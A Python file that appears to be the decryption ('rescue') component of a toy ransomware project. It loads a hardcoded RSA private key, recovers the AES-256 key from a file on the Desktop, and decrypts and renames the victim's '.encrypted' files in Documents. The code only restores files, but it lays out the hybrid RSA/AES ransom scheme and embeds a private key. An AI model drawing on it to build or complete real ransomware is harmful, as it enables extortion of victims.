import os
import glob
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

def decrypt_key():
    """ Decrypts the AES-256 key used to encrypt the victim's files
    Returns:
        key(bytes): Decrypted key
    """
    priv_key = b"-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAyjyYKllMtF/vMyZ0zTBINVPl8Z+6aCcj0cRuW1frrG6+G5tw\nmb258PxF4PK9sKspXZM5D2IO3zb3bZb9GSvZ2UsvFURQwhtmBjKTcJcw80DoGLIh\nBGFndG6V9jT/4ekWT1XPnlTtuVF+Pz4xw2pbeX/kwy0eH2aca5uHubrcqzp5UCxx\n9glUF1e5maiQy6Bl+xeFHC23MQmMq/nChnWrKQtbOAK5bDPPNbze6AWC05okPwjH\ngf2PkRBAFmlRxxYEHhwP9c8ccr+etkiu6HYWYCBV0aovObONuTLGOdIn8IYWz6Df\nd2tww9ttGicu9ToIQFTCt2THPXKMKHQioEXdUwIDAQABAoIBAAmVZi9DkhNOJIYL\nrCdObW2RhJO3BQdggMhfraHIgH49tTvrrsyqUABv2Vk38kNH/oAqX4mEv72rhigm\n/+bMdti0QQ6Z8SscT0Zl6SoXEBZxnKNm9ZJBPLzTbL8ryHXKgj3PjDTYQ3evuUgt\nSKsWWYVgHoAdSDsmtVeSxD4fRnZwC7Ng1dhSp5dynApI2ZEKeO2topgfKR2FbPH8\nzdiRnBw4lPhaRyu/zq2yNQ2X0XHTWZjNghVnvm8Ys4kf5tA/ZGT62SGmuAgq6URs\nn0Cb+TgLhnL6qGDz1SmCskwB6Xuhx2/l9VV8XC5NMEN7+yg8Ido9Y6S0EjYok2YK\nFVHas1kCgYEA6QtGzLhNi+aCPteHA6lWbbxNY7wJQXsr/v8usgWpQEVfSyG4oesV\niLu3rpP6Y/4Gm8FrkAbJYgZWTBOwQSWg0S/vf7PqL6FShxgEIl7Jp1u2ueeKpzmu\nm2lzG734Ls5g48QKE2p9e1d25CI6p/OindWwvBV7i8fRDRwmY2eQc40CgYEA3ihx\nJ012xIcmI2QrgpeHU94UisvJ55mTKcNmUkBiFPTQwYJctI8F81+KzQtLvhA6eVak\nwTOPFXxKPGYD1YQfjmWfYRgBMnsSWyDRh+cTWQ/WIOo5aYh6e3JafDzNg2fxIBzr\n9J/YTpzw5OejOMMrCmHpI6rrYehrGf5AOe/57F8CgYAGTfzLWw0WBNVvN8t6SOGC\ntH5vfU3OzLNDAcpUnJyYlYffc3kYQFDj0xhEC9LRU7UAD7qGOfjGwx8gjcPN72Or\nZR2YmdhzE201JGwwNdpEwdFutBnnLkNQBwlLLdeCBKlQYCRZpB7i8FnSEC8ADjJP\nDNHsNLST8oLwVNuhAtNAnQKBgBbXLZsO2dEm3ALzf42zqpQy1wXWIfIP1hOLJW/7\ncpoY+YWLs6BUvBXjks+2A5mM7ZYgFFxQwrtAxhkjm+1N4jivtg0zfJwGD0MTQreo\nSFL1z9weeLyi7YTXovn2/mIuQ5o7nv7NmF2swQ+nyR5C4p/0pRWnsv+j9676dvv9\n8kIdAoGAXRY9U1n/AvwYJBa/CbkuXMYi6s/CKq4PKYP5gDq2WYxsvcwjrcvdruRB\nBFWyiQ6eU38SU9/tRH0wSHTOz7m/OI4gwVCnSMOoVQ7QQgcAQxel9wVDUAl7Yz4M\noJbcFBI0yK7syVSbJzS6J9Gq3m2FHYqXwyDRDu6DGRhF3StYsIs=\n-----END RSA PRIVATE KEY-----"
    path = os.path.join(os.environ['USERPROFILE'], 'Desktop') + '\\key.encrypted'
    key_file = open(path, 'rb')
    private_key = serialization.load_pem_private_key(
        priv_key, 
        password=None, 
        backend=default_backend())
    key = private_key.decrypt(
        key_file.read(),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None))
    return key

def decrypt(filename, key):
    """ Given a file's absolute path and a key decrypts the file and deletes
    the encrypted one
    """
    BUFFER_SIZE = 1024 * 1024
    file_enc = open(filename, 'rb')
    iv = file_enc.read(16)
    cipher = Cipher(
        algorithms.AES(key),
        modes.OFB(iv),
    )
    decryptor = cipher.decryptor()
    data = file_enc.read(BUFFER_SIZE)
    file_output = open(filename[:-10], 'wb')
    while len(data):
        file_output.write(decryptor.update(data))
        data = file_enc.read(BUFFER_SIZE)
    file_enc.close()
    file_output.close()
    os.remove(filename)

def main():
    """ Rescue program workflow:
    - Decrypt the AES256 key with the attackers private key 
    - Decrypts all the '.encrypted' files returning them to the original
      name
    ***Disclaimer: The hardcoded private key is a disposable one. Never
    compromise personal private keys***
    """
    key = decrypt_key()
    path = os.path.join(os.environ['USERPROFILE'], 'Documents')
    for filename in glob.glob(os.path.join(path, '*.encrypted')):
        decrypt(filename, key)

